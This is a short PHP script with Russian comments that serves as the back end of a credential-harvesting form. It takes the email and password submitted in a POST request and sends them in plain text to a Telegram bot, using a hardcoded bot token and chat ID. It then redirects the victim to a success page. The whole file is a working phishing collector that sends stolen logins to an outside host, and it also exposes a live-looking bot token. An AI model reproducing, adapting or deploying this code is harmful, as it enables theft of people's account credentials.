<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Получаем данные формы
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Настройки Telegram
    $telegram_token = '7433120316:AAGDpLKMuRQz7eLuHlf-Rsd13Y3m9-qyLnw';  // Замените на ваш токен бота
    $telegram_chat_id = '278006495';  // Замените на ваш ID чата

    // Сообщение, которое отправим в Telegram
    $telegram_message = "Логин: $email\nПароль: $password";

    // URL для отправки запроса в Telegram API
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message);

    // Отправляем запрос
    $response = file_get_contents($url);

    // Проверяем результат
    if ($response) {
        // Перенаправляем на страницу успеха
        header("Location: success.html");
        exit();
    } else {
        echo "Ошибка при отправке данных в Telegram.";
    }
} else {
    echo "Метод не поддерживается. Используйте POST-запрос.";
}
?>
